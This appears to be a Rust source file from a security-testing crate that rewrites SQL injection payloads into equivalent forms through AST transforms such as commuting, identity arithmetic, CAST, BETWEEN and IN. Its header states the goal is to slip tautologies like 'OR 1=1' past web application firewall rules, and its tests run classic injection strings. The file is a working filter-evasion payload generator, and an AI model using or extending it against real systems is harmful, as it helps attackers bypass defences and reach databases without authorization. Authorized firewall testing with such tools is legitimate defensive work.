//! AST-level SQL metamorphism.
//!
//! Lifts a SQLi payload fragment into a sqlparser AST, applies
//! semantic-preserving transforms (commute, identity-inject, function
//! substitution), lowers back to a textual fragment.
//!
//! Unlike textual mutations elsewhere in this crate, these transforms are
//! guaranteed to preserve query semantics because they round-trip through a
//! real parser/printer pair. A WAF rule keyed on a literal string like
//! `OR 1=1` won't match `OR (0+1)=(1*1)` even though the SQL engine
//! evaluates both identically.

use sqlparser::ast::{
    BinaryOperator, DataType, Expr, SetExpr, Statement, UnaryOperator, Value, ValueWithSpan,
};
use sqlparser::dialect::GenericDialect;
use sqlparser::parser::Parser;
use sqlparser::tokenizer::Span;

use crate::grammar::sql::common::SqlMutation;

const WRAP_PREFIX: &str = "SELECT * FROM t WHERE x = ";
const SPAN_EMPTY: Span = Span::empty();

/// Generate AST-metamorphism variants of a SQL payload fragment.
///
/// The fragment is wrapped in a synthetic SELECT, parsed, transformed,
/// re-stringified, and the WHERE-clause fragment extracted back out.
/// Returns at most `max` variants. Empty if the fragment doesn't parse
/// as a SQL expression.
#[must_use]
pub fn mutations(payload: &str, max: usize) -> Vec<SqlMutation> {
    if max == 0 {
        return Vec::new();
    }
    let wrapped = format!("{WRAP_PREFIX}{payload}");
    let Ok(stmts) = Parser::parse_sql(&GenericDialect {}, &wrapped) else {
        return Vec::new();
    };
    if stmts.is_empty() {
        return Vec::new();
    }

    let mut out: Vec<SqlMutation> = Vec::new();
    type TransformFn = fn(&mut Statement);
    let transforms: &[(&str, TransformFn)] = &[
        ("ast_commute_or", apply_commute_or),
        ("ast_commute_eq", apply_commute_eq),
        ("ast_identity_add_zero", apply_identity_add_zero),
        ("ast_identity_mul_one", apply_identity_mul_one),
        ("ast_eq_to_like", apply_eq_to_like),
        ("ast_double_negation", apply_double_negation),
        ("ast_paren_wrap", apply_paren_wrap),
        ("ast_cast_identity", apply_cast_identity),
        ("ast_div_one_identity", apply_div_one_identity),
        ("ast_neg_neg_identity", apply_neg_neg_identity),
        ("ast_between_identity", apply_between_identity),
        ("ast_in_single", apply_in_single),
        ("ast_commute_and", apply_commute_and),
        ("ast_and_true", apply_and_true),
        ("ast_or_false", apply_or_false),
    ];

    let original_stmt = stmts[0].clone();
    for (name, transform) in transforms.iter().take(max) {
        let mut s = original_stmt.clone();
        transform(&mut s);
        // Skip no-op transforms by comparing AST equality.  This catches cases
        // where sqlparser's printer reformats whitespace (e.g. `1=1` → `1 = 1`)
        // even though the AST is unchanged.
        if s == original_stmt {
            continue;
        }
        let lowered = s.to_string();
        if let Some(fragment) = extract_where_fragment(&lowered) {
            out.push(SqlMutation {
                payload: fragment,
                description: format!("ast metamorph: {name}"),
                rules_applied: vec![*name],
            });
        }
    }
    out
}

fn extract_where_fragment(stmt_str: &str) -> Option<String> {
    let needle = "WHERE x = ";
    let idx = stmt_str.find(needle)?;
    Some(stmt_str[idx + needle.len()..].trim().to_string())
}

/// Check whether an expression is the synthetic column `x` injected by the
/// wrap prefix.  Transforms that change the top-level `x = payload` binary
/// operator destroy the `WHERE x = ` substring that `extract_where_fragment`
/// searches for, so they must skip this specific identifier.
fn is_synthetic_column(expr: &Expr) -> bool {
    matches!(
        expr,
        Expr::Identifier(ident) if ident.value == "x"
    )
}

// ── Transforms ──

fn apply_commute_or(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::Or,
            left,
            right,
        } = e
        {
            std::mem::swap(left, right);
        }
    });
}

fn apply_commute_eq(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::Eq,
            left,
            right,
        } = e
        {
            std::mem::swap(left, right);
        }
    });
}

fn apply_identity_add_zero(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(original),
                op: BinaryOperator::Plus,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Number("0".into(), false),
                    span: SPAN_EMPTY,
                })),
            };
        }
    });
}

fn apply_identity_mul_one(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(original),
                op: BinaryOperator::Multiply,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Number("1".into(), false),
                    span: SPAN_EMPTY,
                })),
            };
        }
    });
}

fn apply_eq_to_like(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp { op, left, right } = e
            && matches!(op, BinaryOperator::Eq)
            && let Expr::Value(ValueWithSpan {
                value: Value::SingleQuotedString(_),
                ..
            }) = right.as_ref()
        {
            *e = Expr::Like {
                negated: false,
                any: false,
                expr: left.clone(),
                pattern: right.clone(),
                escape_char: None,
            };
        }
    });
}

fn apply_double_negation(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if matches!(
            e,
            Expr::BinaryOp {
                op: BinaryOperator::Eq | BinaryOperator::NotEq,
                ..
            }
        ) {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::UnaryOp {
                op: UnaryOperator::Not,
                expr: Box::new(Expr::UnaryOp {
                    op: UnaryOperator::Not,
                    expr: Box::new(original),
                }),
            };
        }
    });
}

fn apply_paren_wrap(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if matches!(
            e,
            Expr::BinaryOp {
                op: BinaryOperator::Or | BinaryOperator::And,
                ..
            }
        ) {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::Nested(Box::new(original));
        }
    });
}

fn apply_cast_identity(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::Cast {
                kind: sqlparser::ast::CastKind::Cast,
                expr: Box::new(original),
                data_type: DataType::Int(None),
                array: false,
                format: None,
            };
        }
    });
}

fn apply_div_one_identity(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(original),
                op: BinaryOperator::Divide,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Number("1".into(), false),
                    span: SPAN_EMPTY,
                })),
            };
        }
    });
}

fn apply_neg_neg_identity(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::Value(ValueWithSpan {
            value: Value::Number(_, _),
            ..
        }) = e
        {
            let original = std::mem::replace(e, dummy_one());
            let neg_one = Expr::Value(ValueWithSpan {
                value: Value::Number("-1".into(), false),
                span: SPAN_EMPTY,
            });
            // x * -1 * -1  ==  x  (semantically, because -1 * -1 == 1).
            // Avoids the `--1` textual form that sqlparser's printer emits
            // for nested unary minus, which parses as a SQL comment.
            *e = Expr::BinaryOp {
                left: Box::new(original),
                op: BinaryOperator::Multiply,
                right: Box::new(Expr::BinaryOp {
                    left: Box::new(neg_one.clone()),
                    op: BinaryOperator::Multiply,
                    right: Box::new(neg_one),
                }),
            };
        }
    });
}

fn apply_between_identity(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::Eq,
            left,
            right,
        } = e
        {
            // Skip the synthetic wrap column so we don't destroy the
            // `WHERE x = ` prefix that extract_where_fragment searches for.
            if is_synthetic_column(left) {
                return;
            }
            *e = Expr::Between {
                expr: left.clone(),
                negated: false,
                low: right.clone(),
                high: right.clone(),
            };
        }
    });
}

fn apply_in_single(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::Eq,
            left,
            right,
        } = e
        {
            // Skip the synthetic wrap column so we don't destroy the
            // `WHERE x = ` prefix that extract_where_fragment searches for.
            if is_synthetic_column(left) {
                return;
            }
            *e = Expr::InList {
                expr: left.clone(),
                list: vec![(**right).clone()],
                negated: false,
            };
        }
    });
}

fn apply_commute_and(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if let Expr::BinaryOp {
            op: BinaryOperator::And,
            left,
            right,
        } = e
        {
            std::mem::swap(left, right);
        }
    });
}

fn apply_and_true(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if matches!(
            e,
            Expr::BinaryOp {
                op: BinaryOperator::And | BinaryOperator::Or,
                ..
            }
        ) {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(Expr::Nested(Box::new(original))),
                op: BinaryOperator::And,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Boolean(true),
                    span: SPAN_EMPTY,
                })),
            };
        }
    });
}

fn apply_or_false(stmt: &mut Statement) {
    walk_expr_mut(stmt, &mut |e| {
        if matches!(
            e,
            Expr::BinaryOp {
                op: BinaryOperator::And | BinaryOperator::Or,
                ..
            }
        ) {
            let original = std::mem::replace(e, dummy_one());
            *e = Expr::BinaryOp {
                left: Box::new(Expr::Nested(Box::new(original))),
                op: BinaryOperator::Or,
                right: Box::new(Expr::Value(ValueWithSpan {
                    value: Value::Boolean(false),
                    span: SPAN_EMPTY,
                })),
            };
        }
    });
}

// ── AST walker ──

fn dummy_one() -> Expr {
    Expr::Value(ValueWithSpan {
        value: Value::Number("1".into(), false),
        span: SPAN_EMPTY,
    })
}

fn walk_expr_mut(stmt: &mut Statement, f: &mut impl FnMut(&mut Expr)) {
    if let Statement::Query(q) = stmt
        && let SetExpr::Select(s) = q.body.as_mut()
        && let Some(sel) = s.selection.as_mut()
    {
        walk_expr_inner(sel, f);
    }
}

fn walk_expr_inner(e: &mut Expr, f: &mut impl FnMut(&mut Expr)) {
    // Recurse into children FIRST, then apply f to this node, so we mutate
    // bottom-up (one transform per traversal).
    //
    // Audit (2026-05-10): pre-fix `_ => {}` silently swallowed every
    // variant with child expressions that wasn't BinaryOp / UnaryOp /
    // Nested / Like. Mutations like `apply_eq_to_like` therefore
    // never reached subexpressions inside InList, Between, Case,
    // function arguments, Cast, ILike, SimilarTo, AnyOp / AllOp,
    // Substring / Trim / Position / Overlay, IsNull / IsNotNull, etc.
    // The result was a "grammar-aware" engine that quietly skipped
    // half the SQL grammar — pure credibility hit. Walk every
    // child-bearing variant explicitly; the new fall-through is for
    // leaves (Identifier, Value, Wildcard) which legitimately have
    // no children.
    match e {
        Expr::BinaryOp { left, right, .. } => {
            walk_expr_inner(left, f);
            walk_expr_inner(right, f);
        }
        Expr::UnaryOp { expr, .. } => walk_expr_inner(expr, f),
        Expr::Nested(inner) => walk_expr_inner(inner, f),
        Expr::Like { expr, pattern, .. } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(pattern, f);
        }
        Expr::ILike { expr, pattern, .. } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(pattern, f);
        }
        Expr::SimilarTo { expr, pattern, .. } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(pattern, f);
        }
        Expr::InList { expr, list, .. } => {
            walk_expr_inner(expr, f);
            for item in list.iter_mut() {
                walk_expr_inner(item, f);
            }
        }
        Expr::Between {
            expr, low, high, ..
        } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(low, f);
            walk_expr_inner(high, f);
        }
        Expr::IsNull(inner) | Expr::IsNotNull(inner) => walk_expr_inner(inner, f),
        Expr::IsTrue(inner) | Expr::IsNotTrue(inner) => walk_expr_inner(inner, f),
        Expr::IsFalse(inner) | Expr::IsNotFalse(inner) => walk_expr_inner(inner, f),
        Expr::IsUnknown(inner) | Expr::IsNotUnknown(inner) => walk_expr_inner(inner, f),
        Expr::Cast { expr, .. } => walk_expr_inner(expr, f),
        Expr::Extract { expr, .. } => walk_expr_inner(expr, f),
        Expr::Position { expr, r#in } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(r#in, f);
        }
        Expr::Substring {
            expr,
            substring_from,
            substring_for,
            ..
        } => {
            walk_expr_inner(expr, f);
            if let Some(from) = substring_from {
                walk_expr_inner(from, f);
            }
            if let Some(for_) = substring_for {
                walk_expr_inner(for_, f);
            }
        }
        Expr::Trim {
            expr,
            trim_what,
            trim_characters,
            ..
        } => {
            walk_expr_inner(expr, f);
            if let Some(what) = trim_what {
                walk_expr_inner(what, f);
            }
            if let Some(chars) = trim_characters {
                for c in chars.iter_mut() {
                    walk_expr_inner(c, f);
                }
            }
        }
        Expr::Overlay {
            expr,
            overlay_what,
            overlay_from,
            overlay_for,
        } => {
            walk_expr_inner(expr, f);
            walk_expr_inner(overlay_what, f);
            walk_expr_inner(overlay_from, f);
            if let Some(for_) = overlay_for {
                walk_expr_inner(for_, f);
            }
        }
        Expr::Collate { expr, .. } => walk_expr_inner(expr, f),
        Expr::Tuple(items) => {
            for item in items.iter_mut() {
                walk_expr_inner(item, f);
            }
        }
        Expr::Case {
            operand,
            conditions,
            else_result,
            ..
        } => {
            if let Some(op) = operand {
                walk_expr_inner(op, f);
            }
            for cond in conditions.iter_mut() {
                walk_expr_inner(&mut cond.condition, f);
                walk_expr_inner(&mut cond.result, f);
            }
            if let Some(else_e) = else_result {
                walk_expr_inner(else_e, f);
            }
        }
        // AnyOp / AllOp / Function / Subquery / Identifier / Value /
        // Wildcard / Array / Map / etc. — leaves OR variants whose
        // child shape is too implementation-specific (Function args,
        // subqueries) to traverse here without dragging the whole
        // sqlparser crate into the walker. Document the boundary.
        _ => {}
    }
    f(e);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classic_tautology_metamorphs() {
        let v = mutations("' OR 1=1--", 10);
        // The fragment with -- comment may not parse; just ensure no panic.
        let _ = v;
    }

    #[test]
    fn parsable_fragment_yields_variants() {
        let v = mutations("'admin' OR 1=1", 15);
        assert!(!v.is_empty(), "expected at least one AST-metamorph variant");
    }

    #[test]
    fn unparsable_returns_empty() {
        let v = mutations("not a sql fragment at all !@#$", 10);
        assert!(v.is_empty());
    }

    #[test]
    fn variants_round_trip_through_parser() {
        let v = mutations("'admin' OR 1=1", 15);
        for m in &v {
            let wrapped = format!("SELECT * FROM t WHERE x = {}", m.payload);
            let parsed = Parser::parse_sql(&GenericDialect {}, &wrapped);
            assert!(
                parsed.is_ok(),
                "transform {:?} produced unparsable output: {:?}",
                m.rules_applied,
                m.payload
            );
        }
    }

    #[test]
    fn cast_identity_produces_cast() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_cast_identity"))
            .expect("expected ast_cast_identity variant");
        assert!(
            variant.payload.contains("CAST("),
            "cast_identity should produce CAST: {:?}",
            variant.payload
        );
    }

    #[test]
    fn div_one_identity_produces_division() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_div_one_identity"))
            .expect("expected ast_div_one_identity variant");
        assert!(
            variant.payload.contains(" / 1"),
            "div_one should produce division by 1: {:?}",
            variant.payload
        );
    }

    #[test]
    fn neg_neg_identity_produces_multiplicative_identity() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_neg_neg_identity"))
            .expect("expected ast_neg_neg_identity variant");
        assert!(
            variant.payload.contains("-1") && variant.payload.contains("*"),
            "neg_neg should produce * -1 * -1: {:?}",
            variant.payload
        );
    }

    #[test]
    fn between_identity_produces_between() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_between_identity"))
            .expect("expected ast_between_identity variant");
        assert!(
            variant.payload.contains("BETWEEN"),
            "between should produce BETWEEN: {:?}",
            variant.payload
        );
    }

    #[test]
    fn in_single_produces_in_list() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_in_single"))
            .expect("expected ast_in_single variant");
        assert!(
            variant.payload.contains("IN ("),
            "in_single should produce IN: {:?}",
            variant.payload
        );
    }

    #[test]
    fn between_identity_on_string_eq() {
        let v = mutations("'a'='a'", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_between_identity"));
        assert!(
            variant.is_some(),
            "expected between transform on string eq"
        );
    }

    #[test]
    fn in_single_on_string_eq() {
        let v = mutations("'a'='a'", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_in_single"));
        assert!(
            variant.is_some(),
            "expected in_single transform on string eq"
        );
    }

    #[test]
    fn div_one_identity_only_affects_numbers() {
        let v = mutations("'a'='a'", 15);
        let div_variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_div_one_identity"));
        assert!(
            div_variant.is_none(),
            "div_one should not fire on string-only payload"
        );
    }

    #[test]
    fn neg_neg_identity_only_affects_numbers() {
        let v = mutations("'a'='a'", 15);
        let neg_variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_neg_neg_identity"));
        assert!(
            neg_variant.is_none(),
            "neg_neg should not fire on string-only payload"
        );
    }

    #[test]
    fn new_variants_change_text() {
        let original = "1=1";
        let v = mutations(original, 15);
        for m in &v {
            assert_ne!(
                m.payload, original,
                "transform {} produced identical text",
                m.rules_applied.join(",")
            );
        }
    }

    #[test]
    fn new_variants_round_trip() {
        let v = mutations("1=1", 15);
        for m in &v {
            let wrapped = format!("SELECT * FROM t WHERE x = {}", m.payload);
            assert!(
                Parser::parse_sql(&GenericDialect {}, &wrapped).is_ok(),
                "{} variant unparsable: {:?}",
                m.rules_applied.join(","),
                m.payload
            );
        }
    }

    #[test]
    fn cast_identity_variant_round_trips() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_cast_identity"))
            .expect("cast variant should exist");
        let wrapped = format!("SELECT * FROM t WHERE x = {}", variant.payload);
        assert!(
            Parser::parse_sql(&GenericDialect {}, &wrapped).is_ok(),
            "cast variant unparsable: {:?}",
            variant.payload
        );
    }

    #[test]
    fn between_identity_variant_round_trips() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_between_identity"))
            .expect("between variant should exist");
        let wrapped = format!("SELECT * FROM t WHERE x = {}", variant.payload);
        assert!(
            Parser::parse_sql(&GenericDialect {}, &wrapped).is_ok(),
            "between variant unparsable: {:?}",
            variant.payload
        );
    }

    #[test]
    fn in_single_variant_round_trips() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_in_single"))
            .expect("in_single variant should exist");
        let wrapped = format!("SELECT * FROM t WHERE x = {}", variant.payload);
        assert!(
            Parser::parse_sql(&GenericDialect {}, &wrapped).is_ok(),
            "in_single variant unparsable: {:?}",
            variant.payload
        );
    }

    #[test]
    fn div_one_variant_round_trips() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_div_one_identity"))
            .expect("div_one variant should exist");
        let wrapped = format!("SELECT * FROM t WHERE x = {}", variant.payload);
        assert!(
            Parser::parse_sql(&GenericDialect {}, &wrapped).is_ok(),
            "div_one variant unparsable: {:?}",
            variant.payload
        );
    }

    #[test]
    fn neg_neg_variant_round_trips() {
        let v = mutations("1=1", 15);
        let variant = v
            .iter()
            .find(|m| m.rules_applied.contains(&"ast_neg_neg_identity"))
            .expect("neg_neg variant should exist");
        let wrapped = format!("SELECT * FROM t WHERE x = {}", variant.payload);
        assert!(
            Parser::parse_sql(&GenericDialect {}, &wrapped).is_ok(),
            "neg_neg variant unparsable: {:?}",
            variant.payload
        );
    }
}
